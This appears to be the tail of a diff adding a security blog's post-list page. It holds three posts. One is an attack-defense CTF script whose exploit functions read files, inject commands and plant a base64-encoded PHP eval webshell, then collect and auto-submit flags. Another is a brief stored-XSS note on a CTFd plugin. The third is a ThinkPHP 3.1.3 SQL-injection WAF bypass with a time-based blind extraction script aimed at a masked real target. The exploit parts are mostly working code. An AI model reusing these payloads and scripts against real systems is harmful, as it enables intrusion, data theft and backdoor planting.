+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp2</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/about.php?file=/flag&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp3</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/editor.php&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;boy&#34;</span>:<span style="color:#e6db74">&#34;cat /flag&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp4</span>(target):
+</span></span><span style="display:flex;"><span>    Filename <span style="color:#f92672">=</span> filename()
+</span></span><span style="display:flex;"><span>    write_backdoor_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/type.php?m=sPD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=&#39;</span><span style="color:#f92672">+</span>Filename
+</span></span><span style="display:flex;"><span>    getflag_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/&#39;</span><span style="color:#f92672">+</span>Filename
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>write_backdoor_url)
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[+]Backdoor is Write in :&#34;</span><span style="color:#f92672">+</span>getflag_url
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>getflag_url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp5</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/articlelist.php?a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp6</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/.aa&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit</span>(flag_value):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://x.x.x.x:8000/api/v1/challenges/attempt&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;challenge_id&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;submission&#34;</span>:flag_value})
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;CSRF-Token&#39;</span>: <span style="color:#e6db74">&#39;c7b3f18a7eac5935b8f4279e53be8824fc304d85599c6e5ebd9ae4e701bb640e&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000/challenges&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;zh-CN,zh;q=0.9&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;PHPSESSID=to9lsb0m9jrpv1hmdg37he5aa2; session=1f8b1fe6-ab39-4fa4-a03d-617a80f0b2b7&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>    req <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url,headers<span style="color:#f92672">=</span>headers,data<span style="color:#f92672">=</span>data,verify <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    print(req<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>):
+</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;x.x.x.x:3</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">80&#34;</span><span style="color:#f92672">.</span>format(str(i)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp1(ip)</span>
+</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> exp2(ip)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp3(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp4(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp5(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp6(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># submit(flag)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));</span>
+</span></span></code></pre></div>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/awd-flag-script/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/ctfd-plugin-xss-/">CTFD plugin xss</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-04-22 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/xss/">XSS</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctfd/">CTFD</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="ctfd-插件-存储型-xss">CTFD 插件 存储型 XSS</h1>
+<p>如下ctfd存在检测作弊的插件</p>
+<p><img src="/img/25de7e35c31c494f8a5283300bf65d20/Untitled.png" alt="/img/25de7e35c31c494f8a5283300bf65d20/Untitled.png"></p>
+<p>创建2个用户，第一个用户 的 username设置为xss的payload，第二个用户随意</p>
+<p><img src="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%201.png" alt="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%201.png"></p>
+<p>登陆用户1，随便做一题拿到flag后，登陆用户2递交用户1的flag，发现被系统检测，访问/notifications，触发xss。</p>
+<p><img src="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%202.png" alt="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%202.png"></p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/ctfd-plugin-xss-/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/thinkphp3.1.3_sql_bypass/">thinkphp3.1.3 sql注入 bypass</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-03-04 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/sql/">sql</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/bypass/">bypass</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/thinkphp/">thinkphp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="thinkphp313-bypass-sql注入">thinkphp3.1.3 bypass sql注入</h1>
+<p>这是某次众测发现的漏洞,开始发现是thinkphp3.1.3框架，尝试了下将参数变成数组形式，返回sql报错,之后就尝试绕过waf。</p>
+<p>url：<code>http://**/console/</code></p>
+<p>登陆处存在sql注入</p>
+<p>存在漏洞的url：<code>http://**/console/Admin/Index/Login.shtml</code></p>
+<p>1、<em>account</em>参数存在<em>sql注入</em>，通过<code>#a%0a</code>可bypass waf 如下语句可造成10秒延迟，验证注入</p>
+<pre tabindex="0"><code>account[]=exp&amp;account[1]=))#a%0aunion(#a%0aselect#a%0a(#a%0aselect#a%0asleep#a%0a(10))#a%0afrom#a%0a(select#a%0asleep#a%0a(10))a)#
+</code></pre><p>2、编写脚本获取数据库名:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://**/console/Admin/Index/Login.shtml&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>strs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#34;</span>
+</span></span><span style="display:flex;"><span>strs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789_&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Cookie&#34;</span>:<span style="color:#e6db74">&#34;PHPSESSID=xxx&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session();
+</span></span><span style="display:flex;"><span>sess<span style="color:#f92672">.</span>headers<span style="color:#f92672">=</span>headers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>xixi <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(i,s,times<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>	t1 <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;account[]&#34;</span>:<span style="color:#e6db74">&#34;exp&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;account[1]&#34;</span>:<span style="color:#e6db74">&#34;))union#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(select#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(1)from#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(select if#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(lower((mid((database()),&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,1)))=&#39;&#34;</span><span style="color:#f92672">+</span>s<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;,sleep#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(4),0))a)#&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;password[]&#34;</span>:<span style="color:#e6db74">&#34;6a&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;verify&#34;</span>:<span style="color:#e6db74">&#34;6677&#34;</span>,
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	print(s)
+</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>post(u,data<span style="color:#f92672">=</span>data,proxies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;http&#34;</span>:<span style="color:#e6db74">&#34;http://127.0.0.1:8080/&#34;</span>})
+</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()<span style="color:#f92672">-</span>t1
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> t<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> times<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> check(i,s,times<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(xixi)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> strs:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> check(i,s)<span style="color:#f92672">==</span><span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>			xixi<span style="color:#f92672">=</span>xixi<span style="color:#f92672">+</span>s
+</span></span><span style="display:flex;"><span>			print(xixi)
+</span></span></code></pre></div>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/thinkphp3.1.3_sql_bypass/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+      <a href="/posts/page/2/" class="button next">
+        <span class="button__text">Older posts</span>
+        <span class="button__icon">→</span>
+      </a>
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
